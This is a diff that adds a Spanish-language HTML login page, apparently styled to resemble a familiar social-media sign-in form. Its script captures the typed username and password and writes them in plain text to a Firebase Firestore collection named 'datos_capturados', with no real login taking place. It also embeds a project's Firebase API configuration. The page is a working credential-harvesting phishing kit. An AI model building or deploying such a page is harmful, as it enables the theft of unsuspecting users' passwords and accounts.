@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Bitácora</title>
+    <style>
+        body { background: #121212; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: sans-serif; }
+        .box { background: #1c1c1c; padding: 30px; border-radius: 10px; width: 300px; text-align: center; border: 1px solid #363636; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #363636; background: #000; color: white; }
+        button { width: 95%; padding: 10px; background: #0095f6; border: none; color: white; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>Ingreso</h2>
+        <input type="text" id="correoInput" placeholder="Usuario">
+        <input type="password" id="claveInput" placeholder="Contraseña">
+        <button id="botonEnviar">Entrar</button>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+          apiKey: "AIzaSyCCee44HaI_Gk5R_6fHeezEHQ0CciU2fmY",
+          authDomain: "app-prueba-b6c8b.firebaseapp.com",
+          projectId: "app-prueba-b6c8b",
+          storageBucket: "app-prueba-b6c8b.firebasestorage.app",
+          messagingSenderId: "81316242382",
+          appId: "1:81316242382:web:8a523d79dbff6ba892419f",
+          measurementId: "G-CPERQFP9TP"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+        
+        document.getElementById("botonEnviar").addEventListener("click", async () => {
+            const c = document.getElementById("correoInput").value;
+            const p = document.getElementById("claveInput").value;
+            await addDoc(collection(db, "datos_capturados"), { datosUsuarioIngresado: c, claveIngresada: p });
+            alert("Enviado");
+        });
+    </script>
+</body>
+</html>
